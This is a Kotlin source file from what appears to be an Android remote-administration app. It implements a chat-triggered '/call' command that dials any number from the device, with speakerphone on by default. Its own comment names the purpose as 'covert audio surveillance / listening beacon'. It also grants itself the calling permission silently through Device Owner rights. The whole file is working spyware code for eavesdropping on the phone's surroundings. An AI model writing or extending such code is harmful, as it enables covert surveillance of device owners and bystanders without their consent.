package com.izhaanintellect.pasa.commands

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.telecom.TelecomManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.izhaanintellect.pasa.admin.PasaDeviceAdmin
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.delay
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Remotely dials an outbound phone call via TelecomManager or ACTION_CALL intent.
 * Supports speakerphone routing for covert audio surveillance / listening beacon.
 *
 * Usage:
 *   /call <phone_number> [speaker|earpiece]
 *   /call +1234567890 speaker
 */
@Singleton
class CallCommand @Inject constructor(
    @ApplicationContext private val context: Context
) : Command {

    override val name = "/call"
    override val description = "Remotely place outbound cellular phone call"
    override val usage = "/call <number> [speaker|earpiece]"

    companion object {
        private const val TAG = "PASA_CallCommand"
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        if (args.isEmpty()) {
            return CommandResult(
                success = false,
                message = """
                    📞 <b>Remote Outbound Calling</b>
                    ━━━━━━━━━━━━━━━━━━━━
                    Place an immediate phone call from the device's cellular radio.

                    ⚠️ <b>Usage:</b>
                    • <code>/call &lt;phone_number&gt; [speaker|earpiece]</code>

                    <b>Examples:</b>
                    • <code>/call +8801700000000</code>
                    • <code>/call +1234567890 speaker</code>

                    💡 <i>Adding <code>speaker</code> routes the call to the speakerphone automatically.</i>
                """.trimIndent()
            )
        }

        val targetRaw = args[0].trim()
        val speakerRequested = args.any { it.equals("speaker", ignoreCase = true) || it.equals("handsfree", ignoreCase = true) }
        val earpieceRequested = args.any { it.equals("earpiece", ignoreCase = true) || it.equals("silent", ignoreCase = true) }
        val useSpeaker = speakerRequested || !earpieceRequested // Default to speaker for remote management

        // Sanitize phone number (permit digits, +, *, #)
        val cleanNumber = targetRaw.filter { it.isDigit() || it == '+' || it == '*' || it == '#' }
        if (cleanNumber.length < 3) {
            return CommandResult(
                success = false,
                message = "❌ <b>Invalid Phone Number:</b> '<code>$targetRaw</code>' is too short or malformed."
            )
        }

        // 1. Verify or Self-Heal CALL_PHONE permission
        ensureCallPermission()

        val hasPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.CALL_PHONE
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) {
            return CommandResult(
                success = false,
                message = "❌ <b>Permission Denied:</b> <code>CALL_PHONE</code> permission is missing.\n" +
                        "If Device Owner is active, run <code>/self_heal</code> to auto-grant."
            )
        }

        // 2. Initiate Call via TelecomManager or ACTION_CALL
        return try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val telecomManager = context.getSystemService(Context.TELECOM_SERVICE) as? TelecomManager
                if (telecomManager != null) {
                    val uri = Uri.fromParts("tel", cleanNumber, null)
                    val extras = Bundle().apply {
                        if (useSpeaker && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, true)
                        }
                    }
                    telecomManager.placeCall(uri, extras)
                    Log.i(TAG, "Call placed via TelecomManager to $cleanNumber (speaker: $useSpeaker)")
                } else {
                    launchCallIntent(cleanNumber)
                }
            } else {
                launchCallIntent(cleanNumber)
            }

            // Post-dial audio routing to speakerphone if requested
            if (useSpeaker && audioManager != null) {
                delay(1200L) // Wait for telephony connection initiation
                try {
                    audioManager.mode = AudioManager.MODE_IN_CALL
                    audioManager.isSpeakerphoneOn = true
                } catch (ae: Exception) {
                    Log.w(TAG, "Speakerphone toggle notice: ${ae.message}")
                }
            }

            val routeTag = if (useSpeaker) "🔊 Speakerphone (Hands-Free)" else "📱 Earpiece (Standard)"

            CommandResult(
                success = true,
                message = """
                    📞 <b>Outbound Phone Call Initiated</b>
                    ━━━━━━━━━━━━━━━━━━━━
                    • Target: <code>$cleanNumber</code>
                    • Audio Routing: <b>$routeTag</b>
                    • Status: <b>DIALING VIA CELLULAR RADIO</b>

                    ℹ️ <i>The phone is placing the call now. Keep line open on the receiving end.</i>
                """.trimIndent()
            )
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException placing call: ${e.message}", e)
            CommandResult(false, "❌ <b>Telephony Security Error:</b> ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to place call: ${e.message}", e)
            CommandResult(false, "❌ <b>Call Initiation Failed:</b> ${e.localizedMessage ?: e.message}")
        }
    }

    private fun launchCallIntent(number: String) {
        val intent = Intent(Intent.ACTION_CALL).apply {
            data = Uri.parse("tel:$number")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
        Log.i(TAG, "Call placed via Intent.ACTION_CALL to $number")
    }

    private fun ensureCallPermission() {
        if (PasaDeviceAdmin.isDeviceOwner(context)) {
            try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = PasaDeviceAdmin.getComponentName(context)
                dpm.setPermissionGrantState(
                    admin,
                    context.packageName,
                    Manifest.permission.CALL_PHONE,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )
            } catch (e: Exception) {
                Log.w(TAG, "Could not self-heal CALL_PHONE via Device Owner: ${e.message}")
            }
        }
    }
}
